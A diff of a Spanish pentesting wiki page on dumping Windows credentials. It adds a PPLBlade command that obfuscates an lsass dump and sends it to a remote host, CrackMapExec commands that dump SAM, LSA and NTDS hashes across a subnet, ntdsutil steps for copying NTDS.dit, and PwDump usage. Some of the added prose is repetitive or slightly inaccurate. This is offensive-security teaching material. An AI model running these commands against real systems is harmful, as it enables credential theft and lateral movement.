@@ -110,23 +110,37 @@ Solo tenemos que tener en cuenta que esta técnica solo se puede ejecutar como *
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
+## Dumpin lsass con PPLBlade
+
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que admite la ofuscación de volcados de memoria y su transferencia a estaciones de trabajo remotas sin dejar rastro en el disco.
+
+**Funcionalidades clave**:
+
+1. Bypass de la protección PPL
+2. Ofuscación de archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
+3. Carga de volcado de memoria con métodos de carga RAW y SMB sin dejar rastro en el disco (volcado sin archivo)
+
+{% code overflow="wrap" %}
+```bash
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+```
+{% endcode %}
+
 ## CrackMapExec
 
-### Extraer hashes SAM
+### Volcar hashes SAM
 
-El comando `crackmapexec` es una herramienta muy útil para realizar pruebas de penetración en entornos de Windows. Una de las funcionalidades que ofrece es la capacidad de extraer los hashes SAM de un sistema objetivo.
+CrackMapExec es una herramienta de pentesting que se utiliza para realizar ataques de enumeración y explotación en entornos de Windows. Una de las funcionalidades de CrackMapExec es la capacidad de volcar los hashes SAM de un sistema Windows.
 
-Para extraer los hashes SAM, puedes utilizar el siguiente comando:
+Los hashes SAM son contraseñas almacenadas en el registro de Windows y se utilizan para autenticar a los usuarios en el sistema. Al volcar los hashes SAM, un atacante puede obtener acceso a las contraseñas de los usuarios y utilizarlas para acceder a otros sistemas o realizar ataques de fuerza bruta.
 
-```plaintext
-crackmapexec <opciones> --sam
-```
+Para volcar los hashes SAM utilizando CrackMapExec, sigue estos pasos:
 
-Este comando buscará y extraerá los hashes SAM almacenados en el sistema objetivo. Los hashes SAM son contraseñas cifradas que se utilizan para autenticar a los usuarios en un sistema Windows. Al extraer estos hashes, puedes intentar crackearlos y obtener las contraseñas originales.
+1. Ejecuta CrackMapExec en tu máquina de ataque.
+2. Utiliza el comando `cme smb <target> -u <username> -p <password> --sam` para iniciar una sesión SMB en el objetivo y volcar los hashes SAM.
+3. Una vez que se complete el volcado, los hashes SAM se guardarán en un archivo de texto en tu máquina de ataque.
 
-Es importante tener en cuenta que extraer los hashes SAM de un sistema sin autorización es ilegal y puede tener consecuencias legales graves. Solo debes utilizar esta técnica en entornos controlados y con el permiso del propietario del sistema.
-
-Una vez que hayas extraído los hashes SAM, puedes utilizar herramientas como `hashcat` o `John the Ripper` para intentar crackearlos y obtener las contraseñas originales.
+Es importante tener en cuenta que el volcado de hashes SAM es una actividad ilegal sin el consentimiento del propietario del sistema. Solo debes utilizar esta técnica en entornos de prueba o con el permiso explícito del propietario del sistema.
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -155,66 +169,77 @@ Para mitigar el riesgo de volcado de secretos de LSA, se recomienda implementar 
 
 - Mantener el sistema operativo y las aplicaciones actualizadas con los últimos parches de seguridad.
 - Utilizar soluciones de seguridad, como firewalls y sistemas de detección de intrusiones, para detectar y bloquear actividades sospechosas.
-- Limitar el acceso a cuentas privilegiadas y utilizar contraseñas fuertes y únicas.
+- Limitar los privilegios de acceso a cuentas de usuario y utilizar contraseñas fuertes y únicas.
+- Utilizar herramientas de cifrado para proteger los datos almacenados en el sistema.
 - Implementar políticas de seguridad que restrinjan el acceso a los archivos y registros del sistema.
-- Monitorear y auditar regularmente los registros de eventos del sistema en busca de actividades sospechosas.
 
 #### Referencias
 
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
-- [Microsoft Security Guidance](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--security-best-practices-for-domain-controller-servers)
+- [Microsoft Security Guidance](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/lsass-security-guidance)
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 ### Volcar el archivo NTDS.dit del controlador de dominio objetivo
 
-Para obtener las credenciales almacenadas en un controlador de dominio (DC) de destino, es necesario volcar el archivo NTDS.dit. Este archivo contiene la base de datos de Active Directory, que incluye información sobre los usuarios y sus contraseñas.
+Para obtener las credenciales almacenadas en un controlador de dominio (DC) de Windows, es necesario extraer el archivo NTDS.dit. Este archivo contiene la base de datos de Active Directory, que incluye información sobre los usuarios y sus contraseñas.
 
-El proceso para volcar el archivo NTDS.dit puede variar dependiendo de la versión de Windows del DC de destino. A continuación se muestra un ejemplo de cómo hacerlo en Windows Server 2016:
+Para realizar esta tarea, se puede utilizar la herramienta `ntdsutil` que viene incluida en Windows Server. A continuación se detallan los pasos a seguir:
 
-1. Abre una sesión de PowerShell en el DC de destino.
-2. Ejecuta el siguiente comando para cargar el módulo de PowerShell necesario:
+1. Iniciar sesión en el controlador de dominio objetivo con privilegios de administrador.
+2. Abrir una ventana de comandos con privilegios elevados.
+3. Ejecutar el siguiente comando para abrir la utilidad `ntdsutil`:
 
-```powershell
-Import-Module ActiveDirectory
-```
+   ```
+   ntdsutil
+   ```
 
-3. Ejecuta el siguiente comando para volcar el archivo NTDS.dit:
+4. Una vez dentro de `ntdsutil`, ejecutar los siguientes comandos en orden:
 
-```powershell
-Get-ADDBAccount -All:$true | Export-ADDBAccount -Server <nombre_del_controlador_de_dominio> -Credential (Get-Credential) -Path <ruta_del_archivo_de_volcado>
-```
+   ```
+   activate instance ntds
+   ifm
+   create full C:\path\to\output\folder
+   quit
+   quit
+   ```
 
-Asegúrate de reemplazar `<nombre_del_controlador_de_dominio>` con el nombre del controlador de dominio de destino y `<ruta_del_archivo_de_volcado>` con la ruta donde deseas guardar el archivo de volcado.
+   Asegúrate de reemplazar `C:\path\to\output\folder` con la ruta de la carpeta donde deseas guardar el archivo NTDS.dit.
 
-Una vez que se haya completado el volcado, tendrás acceso al archivo NTDS.dit, que contiene las credenciales almacenadas en el controlador de dominio de destino.
+5. El archivo NTDS.dit se guardará en la ubicación especificada.
+
+Una vez que hayas obtenido el archivo NTDS.dit, podrás utilizar herramientas como `mimikatz` para extraer las credenciales almacenadas en él.
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 ### Volcar el historial de contraseñas de NTDS.dit desde el controlador de dominio objetivo
 
-Para obtener el historial de contraseñas almacenado en el archivo NTDS.dit de un controlador de dominio objetivo en Windows, puedes seguir los siguientes pasos:
+Para obtener el historial de contraseñas almacenado en el archivo NTDS.dit de un controlador de dominio objetivo en Windows, podemos utilizar la herramienta `ntdsutil`. Sigue los pasos a continuación:
 
-1. Descarga e instala la herramienta `ntdsutil` en tu máquina de ataque.
+1. Inicia sesión en una máquina con privilegios de administrador en el dominio objetivo.
+2. Abre una ventana de comandos con privilegios elevados.
+3. Ejecuta el siguiente comando para iniciar `ntdsutil`:
 
-2. Abre una ventana de comandos y ejecuta `ntdsutil` para iniciar la utilidad.
+   ```
+   ntdsutil
+   ```
 
-3. Dentro de `ntdsutil`, ejecuta los siguientes comandos:
+4. Una vez dentro de `ntdsutil`, ejecuta los siguientes comandos en orden:
 
-```
-activate instance ntds
-ifm
-create full C:\path\to\output\folder
-```
+   ```
+   activate instance ntds
+   ifm
+   create full C:\path\to\output\folder
+   quit
+   quit
+   ```
 
-Asegúrate de reemplazar `C:\path\to\output\folder` con la ruta de la carpeta donde deseas guardar los archivos de salida.
+   Asegúrate de reemplazar `C:\path\to\output\folder` con la ruta de la carpeta donde deseas guardar el archivo de volcado.
 
-4. Espera a que se complete el proceso de exportación. Una vez finalizado, encontrarás los archivos `ntds.dit` y `system` en la carpeta de salida especificada.
+5. El comando `create full` creará una copia completa de la base de datos NTDS.dit en la ubicación especificada.
 
-Estos archivos contienen el historial de contraseñas almacenado en el controlador de dominio objetivo. Puedes utilizar herramientas como `hashcat` para extraer y descifrar las contraseñas de estos archivos.
-
-Recuerda que este proceso debe realizarse de manera ética y legal, solo en sistemas en los que tengas permiso para realizar pruebas de penetración o auditorías de seguridad.
+Una vez completados estos pasos, tendrás una copia del archivo NTDS.dit en la ubicación especificada. Puedes analizar este archivo para extraer el historial de contraseñas utilizando herramientas como `Mimikatz` u otras herramientas de análisis de contraseñas.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -308,7 +333,7 @@ Este archivo es una base de datos Extensible Storage Engine (ESE) y está compue
 
 Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows utiliza Ntdsa.dll para interactuar con ese archivo y es utilizado por lsass.exe. Luego, parte del archivo NTDS.dit podría estar ubicado dentro de la memoria de `lsass` (puede encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento mediante el uso de una caché).
+Windows utiliza Ntdsa.dll para interactuar con ese archivo y es utilizado por lsass.exe. Luego, parte del archivo NTDS.dit podría estar ubicado dentro de la memoria de `lsass` (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento mediante el uso de una caché).
 
 #### Descifrando los hashes dentro de NTDS.dit
 
@@ -318,7 +343,7 @@ El hash está cifrado 3 veces:
 2. Descifrar el hash utilizando PEK y RC4.
 3. Descifrar el hash utilizando DES.
 
-PEK tiene el mismo valor en cada controlador de dominio, pero está cifrado dentro del archivo NTDS.dit utilizando la BOOTKEY del archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio). Por eso, para obtener las credenciales del archivo NTDS.dit, necesitas los archivos NTDS.dit y SYSTEM (_C:\Windows\System32\config\SYSTEM_).
+PEK tiene el mismo valor en cada controlador de dominio, pero está cifrado dentro del archivo NTDS.dit utilizando la BOOTKEY del archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio). Por eso, para obtener las credenciales del archivo NTDS.dit necesitas los archivos NTDS.dit y SYSTEM (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copiando NTDS.dit utilizando Ntdsutil
 
@@ -348,7 +373,7 @@ Los objetos de NTDS pueden ser extraídos a una base de datos SQLite con [ntdsdo
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-El archivo `SYSTEM` es opcional pero permite la desencriptación de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves de Kerberos o de confianza, historiales de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marca de tiempo del último inicio de sesión y cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...
+El archivo `SYSTEM` es opcional pero permite la desencriptación de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto plano, claves de kerberos o de confianza, historial de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marca de tiempo del último inicio de sesión y cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...
 
 ## Lazagne
 
@@ -372,6 +397,21 @@ fgdump.exe
 ### PwDump
 
 Extraer credenciales del archivo SAM
+
+PwDump es una herramienta que permite extraer las credenciales almacenadas en el archivo SAM de un sistema Windows. El archivo SAM contiene las contraseñas de los usuarios locales en formato hash. Al extraer estas credenciales, un atacante puede intentar crackear las contraseñas y obtener acceso no autorizado al sistema.
+
+PwDump se ejecuta en el contexto del sistema operativo y requiere privilegios de administrador para funcionar correctamente. Una vez ejecutado, PwDump buscará el archivo SAM en la ubicación predeterminada y extraerá los hashes de las contraseñas.
+
+Es importante tener en cuenta que PwDump solo puede extraer las contraseñas almacenadas localmente en el sistema. No puede extraer las contraseñas de cuentas de dominio o de otros sistemas remotos.
+
+Para utilizar PwDump, sigue estos pasos:
+
+1. Descarga la herramienta PwDump en tu sistema Windows.
+2. Ejecuta PwDump con privilegios de administrador.
+3. PwDump buscará automáticamente el archivo SAM en la ubicación predeterminada y extraerá los hashes de las contraseñas.
+4. Guarda los hashes de las contraseñas en un archivo para su posterior análisis y crackeo.
+
+Recuerda que el uso de PwDump u otras herramientas similares para extraer credenciales sin autorización es ilegal y puede tener consecuencias legales graves. Solo debes utilizar estas herramientas en un entorno controlado y con el consentimiento explícito del propietario del sistema.
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -384,8 +424,6 @@ Descárgalo desde: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasc
 ## Defensas
 
 [Aprende sobre algunas protecciones de credenciales aquí.](credentials-protections.md)
-
-
 
 <details>
 
